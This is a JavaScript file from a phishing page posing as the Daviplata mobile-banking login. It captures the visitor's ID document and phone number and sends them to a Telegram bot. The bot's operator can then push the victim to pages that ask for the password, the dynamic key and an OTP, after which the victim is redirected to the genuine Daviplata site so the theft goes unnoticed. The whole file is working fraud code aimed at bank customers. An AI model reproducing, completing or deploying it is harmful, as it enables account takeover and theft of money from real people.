/**
 * DAVIPLATA - script.js OPTIMIZADO
 * Página principal con integración al sistema centralizado
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Daviplata Index: Inicializando...');
    
    // Verificar que BancoUtils esté disponible
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    // Inicializar socket
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    // Elementos del DOM
    const inputs = {
        documentType: document.getElementById('documentType'),
        documentNumber: document.getElementById('documentNumber'),
        phoneNumber: document.getElementById('phoneNumber')
    };
    const btnContinue = document.getElementById('btnContinue');
    const overlay = document.getElementById('loadingOverlay');
    
    console.log('📋 Elementos:', { inputs, btnContinue, overlay });

    // Configurar acciones de Telegram
    BancoUtils.onTelegramAction(handleTelegramAction);

    // Validación de inputs
    inputs.documentNumber.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.documentNumber, 10);
        validateForm();
    });

    inputs.phoneNumber.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.phoneNumber, 10);
        validateForm();
    });

    function validateForm() {
        const isValid = inputs.documentNumber.value.length >= 6 && 
                       inputs.phoneNumber.value.length === 10;
        btnContinue.disabled = !isValid;
        if (isValid) {
            btnContinue.classList.add('enabled');
        } else {
            btnContinue.classList.remove('enabled');
        }
    }

    // Validación inicial
    validateForm();

    // Click directo en el botón
    btnContinue.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinue.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = {
            tipoDocumento: inputs.documentType.options[inputs.documentType.selectedIndex].text,
            numeroDocumento: inputs.documentNumber.value,
            numeroCelular: inputs.phoneNumber.value
        };

        console.log('📤 Datos a enviar:', data);
        BancoUtils.saveBankData('daviplata', data);

        const message = BancoUtils.formatMessage('DAVIPLATA - USUARIO', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '📱 Pedir Usuario', action: 'request_user' },
            { text: '🔐 Pedir Contraseña', action: 'request_password' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('user', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.remove('show', 'active');
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        switch(data.action) {
            case 'request_user':
                inputs.documentType.selectedIndex = 0;
                inputs.documentNumber.value = '';
                inputs.phoneNumber.value = '';
                btnContinue.disabled = true;
                break;
            case 'request_password':
                BancoUtils.hideOverlay();
                window.location.href = 'clave.html';
                break;
            case 'request_dynamic':
                BancoUtils.hideOverlay();
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                BancoUtils.hideOverlay();
                window.location.href = 'otp.html';
                break;
            case 'finish':
                BancoUtils.hideOverlay();
                window.location.href = 'https://www.daviplata.com/';
                break;
        }
    }
});
